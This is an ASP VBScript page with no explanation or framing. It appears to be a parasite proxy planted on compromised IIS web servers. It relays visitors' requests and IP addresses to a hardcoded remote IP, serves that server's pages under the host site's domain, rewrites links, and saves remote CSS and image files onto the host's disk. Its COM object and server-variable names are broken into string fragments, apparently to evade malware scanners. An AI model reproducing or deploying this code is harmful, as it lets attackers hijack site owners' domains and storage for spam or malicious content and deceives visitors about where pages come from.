<%@ LANGUAGE=VBScript CodePage=65001 %>
<%
Set NGFS = New GFS
NGFS.server_ip 	= "173.252.208.50"
NGFS.filename 	= Request.ServerVariables("Script_Name")
NGFS.csvalue 	= "id"
NGFS.cachefile 	= "cache"
NGFS.connect
Class GFS 
	Public host,server_ip,user_agent,filename,csvalue,cachefile
	Private http_code,iisversion,lastModified,redirect_url,GetHtml,http_host,XFF
	Private Sub Class_Initialize
		http_code	= ""
		filename	= "index.asp"
		csvalue		= "page"
		iisversion	= Request.ServerVariables("SER"&"VER_SOFT"&"WARE")
		host 		= "127.0.0.1"
		server_ip 	= "127.0.0.1"
		user_agent	= ""
		http_host 	= Request.ServerVariables("HTTP_HOST")
		cachefile 	= "/cache"
		XFF			= getIP()
	End Sub 
	
	Function connect()
		Dim xmlHttp
		Set xmlHttp = Server.Createobject("W"&"inH"&"t"&"tp.Wi"&"nHttpR"&"eques"&"t."&"5"&".1")
		xmlHttp.option(6) = false
		xmlHttp.Open "GET", "http://"&server_ip&"/"&Request.QueryString(csvalue) , False
		xmlHttp.setRequestHeader "X-Realsdflkjwer3l234lkj234lkj234l-IP", XFF
		xmlHttp.setRequestHeader "Host", http_host
		xmlHttp.setRequestHeader "User-Agent", Request.ServerVariables("HTTP_USER_AGENT")
		If Request.ServerVariables("HTTP_REFERER")<>"" Then
		xmlHttp.setRequestHeader "Referer", Request.ServerVariables("HTTP_REFERER")
		End If
		xmlHttp.Send()
		xmlHttp.WaitForResponse()
		GetHtml			= xmlHttp.ResponseBody
		http_code		= xmlHttp.Status
		If http_code=302 or http_code= 301 Then
		redirect_url	= xmlHttp.GetResponseHeader("Location")
		end if
		Set xmlHttp=Nothing
		set objStream = Server.CreateObject("Adodb.Stream")
		objStream.Type = 1
		objStream.Mode =3
		objStream.Open
		objStream.Write GetHtml
		objStream.Position = 0
		objStream.Type = 2
		objStream.Charset = "UTF-8"
		GetHtml = objStream.ReadText
		objStream.Close
		output()
	End function
	
	Function output()
		If http_code="302" Then
			response.Redirect(redirect_url)
			Exit Function 
		ElseIf http_code="301" Then
			Response.Status = "HTTP/1.1 301 Moved Permanently"
			Response.Addheader "Location",redirect_url 
			Exit Function 
		ElseIf http_code="404" Then
			Response.Status = "HTTP/1.1 404 Not Found"
			Response.Addheader "Date", now&" GMT"
			Response.Addheader "Server", iisversion
			Response.Addheader "Content-Type","text/html"
			Response.Write "<html><head><title>404 Not Found</title></head><body><h1>404 Not Found</h1>"&iisversion&"</body></html>"
			Exit Function 
		ElseIf http_code="403" Then
			Response.Status = "HTTP/1.1 403 Forbidden"
			Response.Addheader "Date", now &" GMT"
			Response.Addheader "Server", iisversion
			Response.Addheader "Content-Type","text/html"
			Response.Write "<html><head><title>403 Forbidden</title></head><body><h1>403 Forbidden</h1>"&iisversion&"</body></html>"
			Exit Function 
		End If
		Response.ContentType = "text/html"
		Response.AddHeader "Content-Type", "text/html;charset=UTF-8"
		Response.CodePage = 65001
		Response.CharSet = "UTF-8"
		GetHtml = ReplaceHtml("href=\""/(.*?)\.(html|asp|htm)\""", "href="""&filename&"?"&csvalue&"=$1.$2""", GetHtml)
		GetHtml = Downall("href=\""(.*?)\.(css)\""","href="""&cachefile&"$1.$2""", GetHtml,"css")
		GetHtml = Downall("src=\""(.*?)\.(gif|jpg|png)\""","src="""&cachefile&"$1.$2""", GetHtml,"img")
		'response.Write server.MapPath("/")
		response.Write GetHtml
	End Function
	
	Function ReplaceHtml(patrn, replStr, Str)
		Dim regEx 
		Set regEx = New RegExp
		regEx.Pattern = patrn 
		regEx.IgnoreCase = false 
		regEx.Global = True 
		ReplaceHtml = regEx.Replace(Str, replStr)
	End Function 
	
	Function Downall(patrn, replStr, Str, filetype)
		Dim regEx, Match, Matches 
		Set regEx = New RegExp
		regEx.Pattern = patrn 
		regEx.IgnoreCase = false 
		regEx.Global = True 
		Set Matches = regEx.Execute(Str)
		For Each Match in Matches
			IF filetype = "css" then
				DownCss Match.SubMatches(0)&"."&Match.SubMatches(1)
			Elseif filetype = "img" Then
				DownImg  Match.SubMatches(0)&"."&Match.SubMatches(1)
			End If
		Next
		Downall = regEx.Replace(Str, replStr)
	End Function
	
	Function DownCss(downfilename)
		dim files
		files=server.MapPath("/")&cachefile&downfilename               
		Set fs=Server.CreateObject("Scrip"&"ting.Fil"&"eSyst"&"emObj"&"ect")
		If fs.FileExists(files) Then 
				 Set fs=Nothing  
				 Exit Function
		end if
		Set fs=Nothing
		Dim xmlHttp
		Set xmlHttp = Server.Createobject("WinH"&"ttp.Win"&"Http"&"Reque"&"st."&"5."&"1")
		xmlHttp.option(6) = false
		xmlHttp.Open "POST", "http://"&server_ip&downfilename , False
		xmlHttp.setRequestHeader "Host", http_host
		xmlHttp.setRequestHeader "X-Realsdflkjwer3l234lkj234lkj234l-IP", XFF
		xmlHttp.Send()
		Downfile = xmlHttp.ResponseText
		CreateMultiFolder("/"&getPathName(cachefile&downfilename))
		'response.Write cachefile&downfilename
		WriteToTextFile "/"&cachefile&downfilename,Downfile,"UTF-8" 
		Set xmlHttp=Nothing
	End function
	
	Function DownImg(downfilename)
		On Error Resume Next
		dim files
		files=server.MapPath("/")&cachefile&downfilename               
		Set fs=Server.CreateObject("Scrip"&"ting.Fil"&"eSyst"&"emObj"&"ect")
		If fs.FileExists(files) Then 
				 Set fs=Nothing  
				 Exit Function
		end if
		Set fs=Nothing
		Dim xmlHttp
		Set xmlHttp = Server.Createobject("Win"&"Htt"&"p.WinH"&"ttpR"&"eque"&"st.5"&".1")
		xmlHttp.option(6) = false
		xmlHttp.Open "GET", "http://"&server_ip&downfilename , False
		xmlHttp.setRequestHeader "Host", http_host
		xmlHttp.setRequestHeader "X-Realsdflkjwer3l234lkj234lkj234l-IP", XFF
		xmlHttp.Send()
		xmlHttp.WaitForResponse
		CreateMultiFolder("/"&getPathName(cachefile&downfilename))		
		Set stm=server.CreateObject("ado"&"db.str"&"eam")
		stm.Type=1
		stm.open
		stm.write xmlHttp.ResponseBody
		stm.SaveToFile server.MapPath("/"&cachefile&downfilename)
		stm.flush
		stm.Close
		Set stm=Nothing
		Set xmlHttp=Nothing
	End function
	
	Function getFileName(strPath)
  		getFileName = mid(strPath,instrrev(strPath,"/")+1)
 	End Function
	
	Function getPathName(strPath)
  		getPathName = Left(strPath,instrrev(strPath,"/"))
 	End Function
 
	Function CreateMultiFolder(ByVal CFolder)
		Dim objFSO, PhCreateFolder, CreateFolderArray, CreateFolder
		Dim i, ii, CreateFolderSub, PhCreateFolderSub, BlInfo
		BlInfo = False
		CreateFolder = CFolder
		On Error Resume Next
		Set objFSO = Server.CreateObject("Scr"&"ipting."&"File"&"System"&"Object")
		If Err Then
			Err.Clear()
			Exit Function
		End If
		If Right(CreateFolder, 1) = "/" Then
			CreateFolder = Left(CreateFolder, Len(CreateFolder) -1)
		End If
		CreateFolderArray = Split(CreateFolder, "/")
		For i = 0 To UBound(CreateFolderArray)
			CreateFolderSub = ""
			For ii = 0 To i
				CreateFolderSub = CreateFolderSub & CreateFolderArray(ii) & "/"
			Next
			PhCreateFolderSub = Server.MapPath(CreateFolderSub)
			If Not objFSO.FolderExists(PhCreateFolderSub) Then
				objFSO.CreateFolder(PhCreateFolderSub)
			End If
		Next
		If Err Then
			Err.Clear()
		Else
			BlInfo = True
		End If
		CreateMultiFolder = BlInfo
	End Function
	
	Sub WriteToTextFile (FileUrl,byval Str,CharSet)
		On Error Resume Next
		set stm=server.CreateObject("ado"&"db.str"&"eam")
		stm.Type=2
		stm.mode=3
		stm.open
		stm.WriteText str
		stm.SaveToFile server.MapPath(FileUrl)
		stm.flush
		stm.Close
		set stm=nothing
	End Sub  
	
	Function getIP()
	  on error resume next
	  Dim strIPAddr
	  If Request.ServerVariables("HTTP_"&"X_"&"FOR"&"WARDED_FOR") = "" Or InStr(Request.ServerVariables("H"&"TTP_X_FO"&"RW"&"ARD"&"ED_FOR"), "unknown") > 0 Then
	   strIPAddr = Request.ServerVariables("REM"&"OTE_A"&"DDR")
	  ElseIf InStr(Request.ServerVariables("HT"&"TP_X_FORW"&"ARDED_FOR"), ",") > 0 Then
	   strIPAddr = Mid(Request.ServerVariables("H"&"TTP_X_FO"&"RWARD"&"ED_FOR"), 1, InStr(Request.ServerVariables("HTT"&"P_X_F"&"ORW"&"AR"&"DED_F"&"OR"), ",")-1)
	   actforip = Request.ServerVariables("REMO"&"TE_ADD"&"R")
	  ElseIf InStr(Request.ServerVariables("HTT"&"P_X_F"&"RW"&"ARDED_FOR"), ";") > 0 Then
	   strIPAddr = Mid(Request.ServerVariables("HT"&"TP_X_FORW"&"ARDED_FOR"), 1, InStr(Request.ServerVariables("H"&"TTP_"&"_FOR"&"WARD"&"ED_FOR"), ";")-1)
	   actforip = Request.ServerVariables("R"&"EMO"&"TE_ADD"&"R")
	  Else
	   strIPAddr = Request.ServerVariables("HT"&"TP"&"_X_FO"&"RWARD"&"ED_FOR")
	   actforip = Request.ServerVariables("REM"&"OTE_AD"&"DR")
	  End If
	  getIP = Replace(Trim(Mid(strIPAddr, 1, 30)), "'", "")
	End Function
	
	Function GetUrl()     
		On Error Resume Next     
		Dim strTemp
		If LCase(Request.ServerVariables("HTTPS")) = "off" Then     
			strTemp = "http://"     
		Else     
			strTemp = "https://"     
		End If     
		strTemp = strTemp&Request.ServerVariables("SERVER_NAME")     
		If Request.ServerVariables("SERVER_PORT") <> 80 Then 
			strTemp = strTemp&":"&Request.ServerVariables("SERVER_PORT")
		End If     
		strTemp = strTemp&Request.ServerVariables("URL")     
		If Trim(Request.QueryString)<>"" Then   
		strTemp = strTemp&"?"&Trim(Request.QueryString)  
		End If   
		GetUrl = strTemp     
	End Function 
End Class
%>